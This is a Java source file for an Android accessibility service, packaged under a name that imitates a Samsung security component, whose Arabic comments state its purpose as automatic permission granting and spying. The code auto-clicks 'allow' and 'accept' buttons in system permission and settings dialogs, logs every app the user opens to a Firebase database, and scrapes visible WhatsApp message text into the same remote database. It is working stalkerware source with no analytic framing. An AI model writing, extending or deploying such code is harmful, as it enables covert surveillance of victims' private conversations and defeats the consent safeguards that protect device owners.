package com.samsung.android.security.v8.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.samsung.android.security.v8.AlKhanjarApp;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * AccessibilityService - خدمة الوصول
 * تستخدم لمنح الصلاحيات تلقائياً والتجسس على الأنشطة
 */
public class MyAccessibilityService extends android.accessibilityservice.AccessibilityService {
    
    private static final String TAG = "AKM_Accessibility";
    private static final String[] AUTO_GRANT_KEYWORDS = {
        "allow", "permit", "continue", "ok", "accept", "grant",
        "السماح", "موافق", "متابعة", "قبول"
    };
    
    private DatabaseReference activityRef;
    private String deviceId;
    
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        
        deviceId = AlKhanjarApp.getDeviceId();
        
        // إعداد Firebase
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        activityRef = database.getReference("activity").child(deviceId);
        
        // تكوين الخدمة
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        
        setServiceInfo(info);
        
        Log.d(TAG, "AccessibilityService connected");
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source == null) return;
            
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            
            // منح الصلاحيات تلقائياً
            if (isPermissionDialog(event, source)) {
                autoGrantPermission(source);
            }
            
            // تسجيل الأنشطة
            logActivity(event, packageName);
            
            // التجسس على WhatsApp
            if (packageName.contains("whatsapp")) {
                captureWhatsAppData(source);
            }
            
            source.recycle();
            
        } catch (Exception e) {
            Log.e(TAG, "Event processing error: " + e.getMessage());
        }
    }
    
    /**
     * التحقق إذا كان حوار صلاحيات
     */
    private boolean isPermissionDialog(AccessibilityEvent event, AccessibilityNodeInfo source) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        
        // حوارات النظام
        if (packageName.contains("packageinstaller") || 
            packageName.contains("permissioncontroller") ||
            packageName.contains("settings")) {
            
            String text = getNodeText(source).toLowerCase();
            return text.contains("permission") || 
                   text.contains("allow") ||
                   text.contains("صلاحية") ||
                   text.contains("السماح");
        }
        
        return false;
    }
    
    /**
     * منح الصلاحية تلقائياً
     */
    private void autoGrantPermission(AccessibilityNodeInfo node) {
        List<AccessibilityNodeInfo> clickableNodes = findClickableNodes(node);
        
        for (AccessibilityNodeInfo clickNode : clickableNodes) {
            String text = getNodeText(clickNode).toLowerCase();
            
            for (String keyword : AUTO_GRANT_KEYWORDS) {
                if (text.contains(keyword)) {
                    clickNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "Auto-granted permission");
                    return;
                }
            }
        }
    }
    
    /**
     * البحث عن العناصر القابلة للنقر
     */
    private List<AccessibilityNodeInfo> findClickableNodes(AccessibilityNodeInfo node) {
        List<AccessibilityNodeInfo> result = new ArrayList<>();
        
        if (node == null) return result;
        
        if (node.isClickable()) {
            result.add(node);
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                result.addAll(findClickableNodes(child));
            }
        }
        
        return result;
    }
    
    /**
     * الحصول على نص العنصر
     */
    private String getNodeText(AccessibilityNodeInfo node) {
        StringBuilder text = new StringBuilder();
        
        if (node.getText() != null) {
            text.append(node.getText().toString()).append(" ");
        }
        
        if (node.getContentDescription() != null) {
            text.append(node.getContentDescription().toString()).append(" ");
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                text.append(getNodeText(child));
            }
        }
        
        return text.toString();
    }
    
    /**
     * تسجيل الأنشطة
     */
    private void logActivity(AccessibilityEvent event, String packageName) {
        try {
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                Map<String, Object> activity = new HashMap<>();
                activity.put("package", packageName);
                activity.put("className", event.getClassName());
                activity.put("timestamp", System.currentTimeMillis());
                
                activityRef.push().setValue(activity);
            }
        } catch (Exception e) {
            Log.e(TAG, "Activity logging error: " + e.getMessage());
        }
    }
    
    /**
     * التقاط بيانات WhatsApp
     */
    private void captureWhatsAppData(AccessibilityNodeInfo node) {
        try {
            String text = getNodeText(node);
            
            if (!text.isEmpty() && text.length() > 10) {
                Map<String, Object> message = new HashMap<>();
                message.put("app", "whatsapp");
                message.put("content", text);
                message.put("timestamp", System.currentTimeMillis());
                
                FirebaseDatabase database = FirebaseDatabase.getInstance();
                database.getReference("messages")
                    .child(deviceId)
                    .push()
                    .setValue(message);
            }
        } catch (Exception e) {
            Log.e(TAG, "WhatsApp capture error: " + e.getMessage());
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "AccessibilityService interrupted");
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "AccessibilityService destroyed");
    }
}
